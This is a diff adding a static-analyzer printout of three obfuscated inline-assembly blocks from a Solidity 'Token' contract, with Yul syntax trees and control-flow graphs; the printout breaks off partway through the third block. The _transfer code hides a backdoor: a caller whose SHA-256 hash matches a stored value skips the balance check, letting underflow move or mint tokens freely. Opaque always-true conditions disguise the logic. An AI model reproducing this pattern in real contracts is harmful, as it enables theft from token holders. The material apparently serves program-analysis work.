@@ -1,0 +1,753 @@
+INFO:AssemblyAstCfg:Input Solidity source only
+INFO:AssemblyAstCfg:InlineAssembly blocks 3
+
+AssemblyBlock 1
+  Contract: Token
+  Function: _transfer(address _from, address _to, uint256 _amount)
+  Visibility: internal
+  SoliditySourceRange: 2079:1372:0 (line 66:9 to 104:9)
+  YulRoot: YulBlock [2088:1363:0]
+  SoliditySnippet:
+    assembly {
+                if iszero(_from) {
+                    revert(0, 0)
+                }
+                if iszero(_to) {
+                    revert(0, 0)
+                }
+                let bbwz := mload(0x40)
+                let bfo228g := basefee()
+                let nezy9b8 := number()
+                if iszero(xor(bfo228g, bfo228g)) {
+                    mstore(bbwz, _from)
+                    mstore(add(bbwz, 32), 0)
+                }
+                let XCUz := keccak256(bbwz, 64)
+                let qVPd := sload(XCUz)
+                let Fpzy := sload(sSgI.slot)
+                mstore(bbwz, shl(96, caller()))
+                if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
+                    revert(0, 0)
+                }
+                let YvIh := mload(bbwz)
+                if iszero(eq(Fpzy, YvIh)) {
+                    if lt(qVPd, _amount) {
+                        let tfe9zci := timestamp()
+                        if eq(tfe9zci, mul(tfe9zci, 1)) {
+                            revert(0, 0)
+                        }
+                    }
+                }
+                sstore(XCUz, sub(qVPd, _amount))
+                mstore(bbwz, _to)
+                mstore(add(bbwz, 32), 0)
+                let iLho := keccak256(bbwz, 64)
+                let bXFg := sload(iLho)
+                sstore(iLho, add(bXFg, _amount))
+                mstore(bbwz, _amount)
+                log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
+            }
+  YulAst:
+    - YulBlock: YulBlock [2088:1363:0]
+      - YulIf: if iszero(_from) [2102:61:0]
+        - YulFunctionCall: YulFunctionCall [2105:13:0]
+          - YulIdentifier: YulIdentifier [2105:6:0]
+          - YulIdentifier: YulIdentifier [2112:5:0]
+        - YulBlock: YulBlock [2119:44:0]
+          - YulExpressionStatement: revert(0, 0) [2137:12:0]
+            - YulFunctionCall: YulFunctionCall [2137:12:0]
+              - YulIdentifier: YulIdentifier [2137:6:0]
+              - YulLiteral: YulLiteral [2144:1:0]
+              - YulLiteral: YulLiteral [2147:1:0]
+      - YulIf: if iszero(_to) [2176:59:0]
+        - YulFunctionCall: YulFunctionCall [2179:11:0]
+          - YulIdentifier: YulIdentifier [2179:6:0]
+          - YulIdentifier: YulIdentifier [2186:3:0]
+        - YulBlock: YulBlock [2191:44:0]
+          - YulExpressionStatement: revert(0, 0) [2209:12:0]
+            - YulFunctionCall: YulFunctionCall [2209:12:0]
+              - YulIdentifier: YulIdentifier [2209:6:0]
+              - YulLiteral: YulLiteral [2216:1:0]
+              - YulLiteral: YulLiteral [2219:1:0]
+      - YulVariableDeclaration: let bbwz := mload(0x40) [2248:23:0]
+        - YulTypedName: YulTypedName [2252:4:0]
+        - YulFunctionCall: YulFunctionCall [2260:11:0]
+          - YulIdentifier: YulIdentifier [2260:5:0]
+          - YulLiteral: YulLiteral [2266:4:0]
+      - YulVariableDeclaration: let bfo228g := basefee() [2284:24:0]
+        - YulTypedName: YulTypedName [2288:7:0]
+        - YulFunctionCall: YulFunctionCall [2299:9:0]
+          - YulIdentifier: YulIdentifier [2299:7:0]
+      - YulVariableDeclaration: let nezy9b8 := number() [2321:23:0]
+        - YulTypedName: YulTypedName [2325:7:0]
+        - YulFunctionCall: YulFunctionCall [2336:8:0]
+          - YulIdentifier: YulIdentifier [2336:6:0]
+      - YulIf: if iszero(xor(bfo228g, bfo228g)) [2357:125:0]
+        - YulFunctionCall: YulFunctionCall [2360:29:0]
+          - YulIdentifier: YulIdentifier [2360:6:0]
+          - YulFunctionCall: YulFunctionCall [2367:21:0]
+            - YulIdentifier: YulIdentifier [2367:3:0]
+            - YulIdentifier: YulIdentifier [2371:7:0]
+            - YulIdentifier: YulIdentifier [2380:7:0]
+        - YulBlock: YulBlock [2390:92:0]
+          - YulExpressionStatement: mstore(bbwz, _from) [2408:19:0]
+            - YulFunctionCall: YulFunctionCall [2408:19:0]
+              - YulIdentifier: YulIdentifier [2408:6:0]
+              - YulIdentifier: YulIdentifier [2415:4:0]
+              - YulIdentifier: YulIdentifier [2421:5:0]
+          - YulExpressionStatement: mstore(add(bbwz, 32), 0) [2444:24:0]
+            - YulFunctionCall: YulFunctionCall [2444:24:0]
+              - YulIdentifier: YulIdentifier [2444:6:0]
+              - YulFunctionCall: YulFunctionCall [2451:13:0]
+                - ...
+              - YulLiteral: YulLiteral [2466:1:0]
+      - YulVariableDeclaration: let XCUz := keccak256(bbwz, 64) [2495:31:0]
+        - YulTypedName: YulTypedName [2499:4:0]
+        - YulFunctionCall: YulFunctionCall [2507:19:0]
+          - YulIdentifier: YulIdentifier [2507:9:0]
+          - YulIdentifier: YulIdentifier [2517:4:0]
+          - YulLiteral: YulLiteral [2523:2:0]
+      - YulVariableDeclaration: let qVPd := sload(XCUz) [2539:23:0]
+        - YulTypedName: YulTypedName [2543:4:0]
+        - YulFunctionCall: YulFunctionCall [2551:11:0]
+          - YulIdentifier: YulIdentifier [2551:5:0]
+          - YulIdentifier: YulIdentifier [2557:4:0]
+      - YulVariableDeclaration: let Fpzy := sload(sSgI.slot) [2575:28:0]
+        - YulTypedName: YulTypedName [2579:4:0]
+        - YulFunctionCall: YulFunctionCall [2587:16:0]
+          - YulIdentifier: YulIdentifier [2587:5:0]
+          - YulIdentifier: YulIdentifier [2593:9:0]
+      - YulExpressionStatement: mstore(bbwz, shl(96, caller())) [2616:31:0]
+        - YulFunctionCall: YulFunctionCall [2616:31:0]
+          - YulIdentifier: YulIdentifier [2616:6:0]
+          - YulIdentifier: YulIdentifier [2623:4:0]
+          - YulFunctionCall: YulFunctionCall [2629:17:0]
+            - YulIdentifier: YulIdentifier [2629:3:0]
+            - YulLiteral: YulLiteral [2633:2:0]
+            - YulFunctionCall: YulFunctionCall [2637:8:0]
+              - YulIdentifier: YulIdentifier [2637:6:0]
+      - YulIf: if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) [2660:96:0]
+        - YulFunctionCall: YulFunctionCall [2663:48:0]
+          - YulIdentifier: YulIdentifier [2663:6:0]
+          - YulFunctionCall: YulFunctionCall [2670:40:0]
+            - YulIdentifier: YulIdentifier [2670:10:0]
+            - YulFunctionCall: YulFunctionCall [2681:5:0]
+              - YulIdentifier: YulIdentifier [2681:3:0]
+            - YulLiteral: YulLiteral [2688:1:0]
+            - YulIdentifier: YulIdentifier [2691:4:0]
+            - YulLiteral: YulLiteral [2697:2:0]
+            - YulIdentifier: YulIdentifier [2701:4:0]
+            - YulLiteral: YulLiteral [2707:2:0]
+        - YulBlock: YulBlock [2712:44:0]
+          - YulExpressionStatement: revert(0, 0) [2730:12:0]
+            - YulFunctionCall: YulFunctionCall [2730:12:0]
+              - YulIdentifier: YulIdentifier [2730:6:0]
+              - YulLiteral: YulLiteral [2737:1:0]
+              - YulLiteral: YulLiteral [2740:1:0]
+      - YulVariableDeclaration: let YvIh := mload(bbwz) [2769:23:0]
+        - YulTypedName: YulTypedName [2773:4:0]
+        - YulFunctionCall: YulFunctionCall [2781:11:0]
+          - YulIdentifier: YulIdentifier [2781:5:0]
+          - YulIdentifier: YulIdentifier [2787:4:0]
+      - YulIf: if iszero(eq(Fpzy, YvIh)) [2805:258:0]
+        - YulFunctionCall: YulFunctionCall [2808:22:0]
+          - YulIdentifier: YulIdentifier [2808:6:0]
+          - YulFunctionCall: YulFunctionCall [2815:14:0]
+            - YulIdentifier: YulIdentifier [2815:2:0]
+            - YulIdentifier: YulIdentifier [2818:4:0]
+            - YulIdentifier: YulIdentifier [2824:4:0]
+        - YulBlock: YulBlock [2831:232:0]
+          - YulIf: if lt(qVPd, _amount) [2849:200:0]
+            - YulFunctionCall: YulFunctionCall [2852:17:0]
+              - YulIdentifier: YulIdentifier [2852:2:0]
+              - YulIdentifier: YulIdentifier [2855:4:0]
+              - YulIdentifier: YulIdentifier [2861:7:0]
+            - YulBlock: YulBlock [2870:179:0]
+              - YulVariableDeclaration: let tfe9zci := timestamp() [2892:26:0]
+                - ...
+              - YulIf: if eq(tfe9zci, mul(tfe9zci, 1)) [2939:92:0]
+                - ...
+      - YulExpressionStatement: sstore(XCUz, sub(qVPd, _amount)) [3076:32:0]
+        - YulFunctionCall: YulFunctionCall [3076:32:0]
+          - YulIdentifier: YulIdentifier [3076:6:0]
+          - YulIdentifier: YulIdentifier [3083:4:0]
+          - YulFunctionCall: YulFunctionCall [3089:18:0]
+            - YulIdentifier: YulIdentifier [3089:3:0]
+            - YulIdentifier: YulIdentifier [3093:4:0]
+            - YulIdentifier: YulIdentifier [3099:7:0]
+      - YulExpressionStatement: mstore(bbwz, _to) [3121:17:0]
+        - YulFunctionCall: YulFunctionCall [3121:17:0]
+          - YulIdentifier: YulIdentifier [3121:6:0]
+          - YulIdentifier: YulIdentifier [3128:4:0]
+          - YulIdentifier: YulIdentifier [3134:3:0]
+      - YulExpressionStatement: mstore(add(bbwz, 32), 0) [3151:24:0]
+        - YulFunctionCall: YulFunctionCall [3151:24:0]
+          - YulIdentifier: YulIdentifier [3151:6:0]
+          - YulFunctionCall: YulFunctionCall [3158:13:0]
+            - YulIdentifier: YulIdentifier [3158:3:0]
+            - YulIdentifier: YulIdentifier [3162:4:0]
+            - YulLiteral: YulLiteral [3168:2:0]
+          - YulLiteral: YulLiteral [3173:1:0]
+      - YulVariableDeclaration: let iLho := keccak256(bbwz, 64) [3188:31:0]
+        - YulTypedName: YulTypedName [3192:4:0]
+        - YulFunctionCall: YulFunctionCall [3200:19:0]
+          - YulIdentifier: YulIdentifier [3200:9:0]
+          - YulIdentifier: YulIdentifier [3210:4:0]
+          - YulLiteral: YulLiteral [3216:2:0]
+      - YulVariableDeclaration: let bXFg := sload(iLho) [3232:23:0]
+        - YulTypedName: YulTypedName [3236:4:0]
+        - YulFunctionCall: YulFunctionCall [3244:11:0]
+          - YulIdentifier: YulIdentifier [3244:5:0]
+          - YulIdentifier: YulIdentifier [3250:4:0]
+      - YulExpressionStatement: sstore(iLho, add(bXFg, _amount)) [3268:32:0]
+        - YulFunctionCall: YulFunctionCall [3268:32:0]
+          - YulIdentifier: YulIdentifier [3268:6:0]
+          - YulIdentifier: YulIdentifier [3275:4:0]
+          - YulFunctionCall: YulFunctionCall [3281:18:0]
+            - YulIdentifier: YulIdentifier [3281:3:0]
+            - YulIdentifier: YulIdentifier [3285:4:0]
+            - YulIdentifier: YulIdentifier [3291:7:0]
+      - YulExpressionStatement: mstore(bbwz, _amount) [3313:21:0]
+        - YulFunctionCall: YulFunctionCall [3313:21:0]
+          - YulIdentifier: YulIdentifier [3313:6:0]
+          - YulIdentifier: YulIdentifier [3320:4:0]
+          - YulIdentifier: YulIdentifier [3326:7:0]
+      - YulExpressionStatement: log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to) [3347:94:0]
+        - YulFunctionCall: YulFunctionCall [3347:94:0]
+          - YulIdentifier: YulIdentifier [3347:4:0]
+          - YulIdentifier: YulIdentifier [3352:4:0]
+          - YulLiteral: YulLiteral [3358:2:0]
+          - YulLiteral: YulLiteral [3362:66:0]
+          - YulIdentifier: YulIdentifier [3430:5:0]
+          - YulIdentifier: YulIdentifier [3437:3:0]
+  LocalCFG:
+    Nodes:
+      N0 [entry] entry
+      N1 [exit] exit
+      N2 [condition] if iszero(_from) @ 2102:61:0 (line 67:13)
+      N3 [merge] if merge @ 2102:61:0 (line 67:13)
+      N4 [terminal] revert(0, 0) @ 2137:12:0 (line 68:17)
+      N5 [condition] if iszero(_to) @ 2176:59:0 (line 70:13)
+      N6 [merge] if merge @ 2176:59:0 (line 70:13)
+      N7 [terminal] revert(0, 0) @ 2209:12:0 (line 71:17)
+      N8 [statement] let bbwz := mload(0x40) @ 2248:23:0 (line 73:13)
+      N9 [statement] let bfo228g := basefee() @ 2284:24:0 (line 74:13)
+      N10 [statement] let nezy9b8 := number() @ 2321:23:0 (line 75:13)
+      N11 [condition] if iszero(xor(bfo228g, bfo228g)) @ 2357:125:0 (line 76:13)
+      N12 [merge] if merge @ 2357:125:0 (line 76:13)
+      N13 [statement] mstore(bbwz, _from) @ 2408:19:0 (line 77:17)
+      N14 [statement] mstore(add(bbwz, 32), 0) @ 2444:24:0 (line 78:17)
+      N15 [statement] let XCUz := keccak256(bbwz, 64) @ 2495:31:0 (line 80:13)
+      N16 [statement] let qVPd := sload(XCUz) @ 2539:23:0 (line 81:13)
+      N17 [statement] let Fpzy := sload(sSgI.slot) @ 2575:28:0 (line 82:13)
+      N18 [statement] mstore(bbwz, shl(96, caller())) @ 2616:31:0 (line 83:13)
+      N19 [condition] if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) @ 2660:96:0 (line 84:13)
+      N20 [merge] if merge @ 2660:96:0 (line 84:13)
+      N21 [terminal] revert(0, 0) @ 2730:12:0 (line 85:17)
+      N22 [statement] let YvIh := mload(bbwz) @ 2769:23:0 (line 87:13)
+      N23 [condition] if iszero(eq(Fpzy, YvIh)) @ 2805:258:0 (line 88:13)
+      N24 [merge] if merge @ 2805:258:0 (line 88:13)
+      N25 [condition] if lt(qVPd, _amount) @ 2849:200:0 (line 89:17)
+      N26 [merge] if merge @ 2849:200:0 (line 89:17)
+      N27 [statement] let tfe9zci := timestamp() @ 2892:26:0 (line 90:21)
+      N28 [condition] if eq(tfe9zci, mul(tfe9zci, 1)) @ 2939:92:0 (line 91:21)
+      N29 [merge] if merge @ 2939:92:0 (line 91:21)
+      N30 [terminal] revert(0, 0) @ 2997:12:0 (line 92:25)
+      N31 [statement] sstore(XCUz, sub(qVPd, _amount)) @ 3076:32:0 (line 96:13)
+      N32 [statement] mstore(bbwz, _to) @ 3121:17:0 (line 97:13)
+      N33 [statement] mstore(add(bbwz, 32), 0) @ 3151:24:0 (line 98:13)
+      N34 [statement] let iLho := keccak256(bbwz, 64) @ 3188:31:0 (line 99:13)
+      N35 [statement] let bXFg := sload(iLho) @ 3232:23:0 (line 100:13)
+      N36 [statement] sstore(iLho, add(bXFg, _amount)) @ 3268:32:0 (line 101:13)
+      N37 [statement] mstore(bbwz, _amount) @ 3313:21:0 (line 102:13)
+      N38 [statement] log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to) @ 3347:94:0 (line 103:13)
+    Edges:
+      N0 --[next]--> N2
+      N2 --[true: iszero(_from)]--> N4
+      N4 --[terminate: revert]--> N1
+      N2 --[false: !(iszero(_from))]--> N3
+      N3 --[next]--> N5
+      N5 --[true: iszero(_to)]--> N7
+      N7 --[terminate: revert]--> N1
+      N5 --[false: !(iszero(_to))]--> N6
+      N6 --[next]--> N8
+      N8 --[next]--> N9
+      N9 --[next]--> N10
+      N10 --[next]--> N11
+      N11 --[true: iszero(xor(bfo228g, bfo228g))]--> N13
+      N13 --[next]--> N14
+      N14 --[next]--> N12
+      N11 --[false: !(iszero(xor(bfo228g, bfo228g)))]--> N12
+      N12 --[next]--> N15
+      N15 --[next]--> N16
+      N16 --[next]--> N17
+      N17 --[next]--> N18
+      N18 --[next]--> N19
+      N19 --[true: iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32))]--> N21
+      N21 --[terminate: revert]--> N1
+      N19 --[false: !(iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)))]--> N20
+      N20 --[next]--> N22
+      N22 --[next]--> N23
+      N23 --[true: iszero(eq(Fpzy, YvIh))]--> N25
+      N25 --[true: lt(qVPd, _amount)]--> N27
+      N27 --[next]--> N28
+      N28 --[true: eq(tfe9zci, mul(tfe9zci, 1))]--> N30
+      N30 --[terminate: revert]--> N1
+      N28 --[false: !(eq(tfe9zci, mul(tfe9zci, 1)))]--> N29
+      N29 --[next]--> N26
+      N25 --[false: !(lt(qVPd, _amount))]--> N26
+      N26 --[next]--> N24
+      N23 --[false: !(iszero(eq(Fpzy, YvIh)))]--> N24
+      N24 --[next]--> N31
+      N31 --[next]--> N32
+      N32 --[next]--> N33
+      N33 --[next]--> N34
+      N34 --[next]--> N35
+      N35 --[next]--> N36
+      N36 --[next]--> N37
+      N37 --[next]--> N38
+      N38 --[next]--> N1
+
+AssemblyBlock 2
+  Contract: Token
+  Function: approve(address _spender, uint256 _amount)
+  Visibility: public
+  SoliditySourceRange: 3555:492:0 (line 108:9 to 119:9)
+  YulRoot: YulBlock [3564:483:0]
+  SoliditySnippet:
+    assembly {
+                let bbwz := mload(0x40)
+                mstore(bbwz, caller())
+                mstore(add(bbwz, 0x20), wZHA.slot)
+                let ZFHJ := keccak256(bbwz, 0x40)
+                mstore(bbwz, _spender)
+                mstore(add(bbwz, 0x20), ZFHJ)
+                let akRJ := keccak256(bbwz, 0x40)
+                sstore(akRJ, _amount)
+                log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
+                mstore(bbwz, _amount)
+            }
+  YulAst:
+    - YulBlock: YulBlock [3564:483:0]
+      - YulVariableDeclaration: let bbwz := mload(0x40) [3578:23:0]
+        - YulTypedName: YulTypedName [3582:4:0]
+        - YulFunctionCall: YulFunctionCall [3590:11:0]
+          - YulIdentifier: YulIdentifier [3590:5:0]
+          - YulLiteral: YulLiteral [3596:4:0]
+      - YulExpressionStatement: mstore(bbwz, caller()) [3614:22:0]
+        - YulFunctionCall: YulFunctionCall [3614:22:0]
+          - YulIdentifier: YulIdentifier [3614:6:0]
+          - YulIdentifier: YulIdentifier [3621:4:0]
+          - YulFunctionCall: YulFunctionCall [3627:8:0]
+            - YulIdentifier: YulIdentifier [3627:6:0]
+      - YulExpressionStatement: mstore(add(bbwz, 0x20), wZHA.slot) [3649:34:0]
+        - YulFunctionCall: YulFunctionCall [3649:34:0]
+          - YulIdentifier: YulIdentifier [3649:6:0]
+          - YulFunctionCall: YulFunctionCall [3656:15:0]
+            - YulIdentifier: YulIdentifier [3656:3:0]
+            - YulIdentifier: YulIdentifier [3660:4:0]
+            - YulLiteral: YulLiteral [3666:4:0]
+          - YulIdentifier: YulIdentifier [3673:9:0]
+      - YulVariableDeclaration: let ZFHJ := keccak256(bbwz, 0x40) [3696:33:0]
+        - YulTypedName: YulTypedName [3700:4:0]
+        - YulFunctionCall: YulFunctionCall [3708:21:0]
+          - YulIdentifier: YulIdentifier [3708:9:0]
+          - YulIdentifier: YulIdentifier [3718:4:0]
+          - YulLiteral: YulLiteral [3724:4:0]
+      - YulExpressionStatement: mstore(bbwz, _spender) [3742:22:0]
+        - YulFunctionCall: YulFunctionCall [3742:22:0]
+          - YulIdentifier: YulIdentifier [3742:6:0]
+          - YulIdentifier: YulIdentifier [3749:4:0]
+          - YulIdentifier: YulIdentifier [3755:8:0]
+      - YulExpressionStatement: mstore(add(bbwz, 0x20), ZFHJ) [3777:29:0]
+        - YulFunctionCall: YulFunctionCall [3777:29:0]
+          - YulIdentifier: YulIdentifier [3777:6:0]
+          - YulFunctionCall: YulFunctionCall [3784:15:0]
+            - YulIdentifier: YulIdentifier [3784:3:0]
+            - YulIdentifier: YulIdentifier [3788:4:0]
+            - YulLiteral: YulLiteral [3794:4:0]
+          - YulIdentifier: YulIdentifier [3801:4:0]
+      - YulVariableDeclaration: let akRJ := keccak256(bbwz, 0x40) [3819:33:0]
+        - YulTypedName: YulTypedName [3823:4:0]
+        - YulFunctionCall: YulFunctionCall [3831:21:0]
+          - YulIdentifier: YulIdentifier [3831:9:0]
+          - YulIdentifier: YulIdentifier [3841:4:0]
+          - YulLiteral: YulLiteral [3847:4:0]
+      - YulExpressionStatement: sstore(akRJ, _amount) [3865:21:0]
+        - YulFunctionCall: YulFunctionCall [3865:21:0]
+          - YulIdentifier: YulIdentifier [3865:6:0]
+          - YulIdentifier: YulIdentifier [3872:4:0]
+          - YulIdentifier: YulIdentifier [3878:7:0]
+      - YulExpressionStatement: log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender) [3899:104:0]
+        - YulFunctionCall: YulFunctionCall [3899:104:0]
+          - YulIdentifier: YulIdentifier [3899:4:0]
+          - YulIdentifier: YulIdentifier [3904:4:0]
+          - YulLiteral: YulLiteral [3910:4:0]
+          - YulLiteral: YulLiteral [3916:66:0]
+          - YulFunctionCall: YulFunctionCall [3984:8:0]
+            - YulIdentifier: YulIdentifier [3984:6:0]
+          - YulIdentifier: YulIdentifier [3994:8:0]
+      - YulExpressionStatement: mstore(bbwz, _amount) [4016:21:0]
+        - YulFunctionCall: YulFunctionCall [4016:21:0]
+          - YulIdentifier: YulIdentifier [4016:6:0]
+          - YulIdentifier: YulIdentifier [4023:4:0]
+          - YulIdentifier: YulIdentifier [4029:7:0]
+  LocalCFG:
+    Nodes:
+      N0 [entry] entry
+      N1 [exit] exit
+      N2 [statement] let bbwz := mload(0x40) @ 3578:23:0 (line 109:13)
+      N3 [statement] mstore(bbwz, caller()) @ 3614:22:0 (line 110:13)
+      N4 [statement] mstore(add(bbwz, 0x20), wZHA.slot) @ 3649:34:0 (line 111:13)
+      N5 [statement] let ZFHJ := keccak256(bbwz, 0x40) @ 3696:33:0 (line 112:13)
+      N6 [statement] mstore(bbwz, _spender) @ 3742:22:0 (line 113:13)
+      N7 [statement] mstore(add(bbwz, 0x20), ZFHJ) @ 3777:29:0 (line 114:13)
+      N8 [statement] let akRJ := keccak256(bbwz, 0x40) @ 3819:33:0 (line 115:13)
+      N9 [statement] sstore(akRJ, _amount) @ 3865:21:0 (line 116:13)
+      N10 [statement] log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender) @ 3899:104:0 (line 117:13)
+      N11 [statement] mstore(bbwz, _amount) @ 4016:21:0 (line 118:13)
+    Edges:
+      N0 --[next]--> N2
+      N2 --[next]--> N3
+      N3 --[next]--> N4
+      N4 --[next]--> N5
+      N5 --[next]--> N6
+      N6 --[next]--> N7
+      N7 --[next]--> N8
+      N8 --[next]--> N9
+      N9 --[next]--> N10
+      N10 --[next]--> N11
+      N11 --[next]--> N1
+
+AssemblyBlock 3
+  Contract: Token
+  Function: _spendAllowance(address _owner, address _spender, uint256 _amount)
+  Visibility: internal
+  SoliditySourceRange: 4183:1445:0 (line 124:9 to 165:9)
+  YulRoot: YulBlock [4192:1436:0]
+  SoliditySnippet:
+    assembly {
+                let bbwz := mload(0x40)
+                mstore(bbwz, sload(qBQC.slot))
+                mstore(add(bbwz, 32), 1)
+                let uAnE := keccak256(bbwz, 64)
+                let bcw8ayf := basefee()
+                let ncwupwx := number()
+                if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) {
+                    mstore(bbwz, _owner)
+                    mstore(add(bbwz, 32), uAnE)
+                }
+                let Jfwv := keccak256(bbwz, 64)
+                let CCkU := sload(Jfwv)
+                let zfPf := CCkU
+                if and(zfPf, iszero(_amount)) {
+                    revert(0, 0)
+                }
+                if iszero(zfPf) {
+                    mstore(bbwz, _owner)
+                    mstore(add(bbwz, 32), 1)
+                    uAnE := keccak256(bbwz, 64)
+                    mstore(bbwz, _spender)
+                    mstore(add(bbwz, 32), uAnE)
+                    Jfwv := keccak256(bbwz, 64)
+                    zfPf := add(sload(Jfwv), CCkU)
+                }
+                let gbj1enk := gas()
+                pop(0)
+                if eq(gbj1enk, and(gbj1enk, gbj1enk)) {
+                    zfPf := sub(zfPf, CCkU)
+                }
+                if iszero(eq(zfPf, not(0))) {
+                    if lt(zfPf, _amount) {
+                        revert(0, 0)
+                    }
+                    let bf51h1a := basefee()
+                    pop(0)
+                    if eq(bf51h1a, and(bf51h1a, bf51h1a)) {
+                        sstore(Jfwv, sub(zfPf, _amount))
+                    }
+                }
+            }
+  YulAst:
+    - YulBlock: YulBlock [4192:1436:0]
+      - YulVariableDeclaration: let bbwz := mload(0x40) [4206:23:0]
+        - YulTypedName: YulTypedName [4210:4:0]
+        - YulFunctionCall: YulFunctionCall [4218:11:0]
+          - YulIdentifier: YulIdentifier [4218:5:0]
+          - YulLiteral: YulLiteral [4224:4:0]
+      - YulExpressionStatement: mstore(bbwz, sload(qBQC.slot)) [4242:30:0]
+        - YulFunctionCall: YulFunctionCall [4242:30:0]
+          - YulIdentifier: YulIdentifier [4242:6:0]
+          - YulIdentifier: YulIdentifier [4249:4:0]
+          - YulFunctionCall: YulFunctionCall [4255:16:0]
+            - YulIdentifier: YulIdentifier [4255:5:0]
+            - YulIdentifier: YulIdentifier [4261:9:0]
+      - YulExpressionStatement: mstore(add(bbwz, 32), 1) [4285:24:0]
+        - YulFunctionCall: YulFunctionCall [4285:24:0]
+          - YulIdentifier: YulIdentifier [4285:6:0]
+          - YulFunctionCall: YulFunctionCall [4292:13:0]
+            - YulIdentifier: YulIdentifier [4292:3:0]
+            - YulIdentifier: YulIdentifier [4296:4:0]
+            - YulLiteral: YulLiteral [4302:2:0]
+          - YulLiteral: YulLiteral [4307:1:0]
+      - YulVariableDeclaration: let uAnE := keccak256(bbwz, 64) [4322:31:0]
+        - YulTypedName: YulTypedName [4326:4:0]
+        - YulFunctionCall: YulFunctionCall [4334:19:0]
+          - YulIdentifier: YulIdentifier [4334:9:0]
+          - YulIdentifier: YulIdentifier [4344:4:0]
+          - YulLiteral: YulLiteral [4350:2:0]
+      - YulVariableDeclaration: let bcw8ayf := basefee() [4366:24:0]
+        - YulTypedName: YulTypedName [4370:7:0]
+        - YulFunctionCall: YulFunctionCall [4381:9:0]
+          - YulIdentifier: YulIdentifier [4381:7:0]
+      - YulVariableDeclaration: let ncwupwx := number() [4403:23:0]
+        - YulTypedName: YulTypedName [4407:7:0]
+        - YulFunctionCall: YulFunctionCall [4418:8:0]
+          - YulIdentifier: YulIdentifier [4418:6:0]
+      - YulIf: if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) [4439:148:0]
+        - YulFunctionCall: YulFunctionCall [4442:48:0]
+          - YulIdentifier: YulIdentifier [4442:2:0]
+          - YulFunctionCall: YulFunctionCall [4445:21:0]
+            - YulIdentifier: YulIdentifier [4445:3:0]
+            - YulIdentifier: YulIdentifier [4449:7:0]
+            - YulIdentifier: YulIdentifier [4458:7:0]
+          - YulFunctionCall: YulFunctionCall [4468:21:0]
+            - YulIdentifier: YulIdentifier [4468:3:0]
+            - YulIdentifier: YulIdentifier [4472:7:0]
+            - YulIdentifier: YulIdentifier [4481:7:0]
+        - YulBlock: YulBlock [4491:96:0]
+          - YulExpressionStatement: mstore(bbwz, _owner) [4509:20:0]
+            - YulFunctionCall: YulFunctionCall [4509:20:0]
+              - YulIdentifier: YulIdentifier [4509:6:0]
+              - YulIdentifier: YulIdentifier [4516:4:0]
+              - YulIdentifier: YulIdentifier [4522:6:0]
+          - YulExpressionStatement: mstore(add(bbwz, 32), uAnE) [4546:27:0]
+            - YulFunctionCall: YulFunctionCall [4546:27:0]
+              - YulIdentifier: YulIdentifier [4546:6:0]
+              - YulFunctionCall: YulFunctionCall [4553:13:0]
+                - ...
+              - YulIdentifier: YulIdentifier [4568:4:0]
+      - YulVariableDeclaration: let Jfwv := keccak256(bbwz, 64) [4600:31:0]
+        - YulTypedName: YulTypedName [4604:4:0]
+        - YulFunctionCall: YulFunctionCall [4612:19:0]
+          - YulIdentifier: YulIdentifier [4612:9:0]
+          - YulIdentifier: YulIdentifier [4622:4:0]
+          - YulLiteral: YulLiteral [4628:2:0]
+      - YulVariableDeclaration: let CCkU := sload(Jfwv) [4644:23:0]
+        - YulTypedName: YulTypedName [4648:4:0]
+        - YulFunctionCall: YulFunctionCall [4656:11:0]
+          - YulIdentifier: YulIdentifier [4656:5:0]
+          - YulIdentifier: YulIdentifier [4662:4:0]
+      - YulVariableDeclaration: let zfPf := CCkU [4680:16:0]
+        - YulTypedName: YulTypedName [4684:4:0]
+        - YulIdentifier: YulIdentifier [4692:4:0]
+      - YulIf: if and(zfPf, iszero(_amount)) [4709:74:0]
+        - YulFunctionCall: YulFunctionCall [4712:26:0]
+          - YulIdentifier: YulIdentifier [4712:3:0]
+          - YulIdentifier: YulIdentifier [4716:4:0]
+          - YulFunctionCall: YulFunctionCall [4722:15:0]
+            - YulIdentifier: YulIdentifier [4722:6:0]
+            - YulIdentifier: YulIdentifier [4729:7:0]
+        - YulBlock: YulBlock [4739:44:0]
+          - YulExpressionStatement: revert(0, 0) [4757:12:0]
+            - YulFunctionCall: YulFunctionCall [4757:12:0]
+              - YulIdentifier: YulIdentifier [4757:6:0]
+              - YulLiteral: YulLiteral [4764:1:0]
+              - YulLiteral: YulLiteral [4767:1:0]
+      - YulIf: if iszero(zfPf) [4796:327:0]
+        - YulFunctionCall: YulFunctionCall [4799:12:0]
+          - YulIdentifier: YulIdentifier [4799:6:0]
+          - YulIdentifier: YulIdentifier [4806:4:0]
+        - YulBlock: YulBlock [4812:311:0]
+          - YulExpressionStatement: mstore(bbwz, _owner) [4830:20:0]
+            - YulFunctionCall: YulFunctionCall [4830:20:0]
+              - YulIdentifier: YulIdentifier [4830:6:0]
+              - YulIdentifier: YulIdentifier [4837:4:0]
+              - YulIdentifier: YulIdentifier [4843:6:0]
+          - YulExpressionStatement: mstore(add(bbwz, 32), 1) [4867:24:0]
+            - YulFunctionCall: YulFunctionCall [4867:24:0]
+              - YulIdentifier: YulIdentifier [4867:6:0]
+              - YulFunctionCall: YulFunctionCall [4874:13:0]
+                - ...
+              - YulLiteral: YulLiteral [4889:1:0]
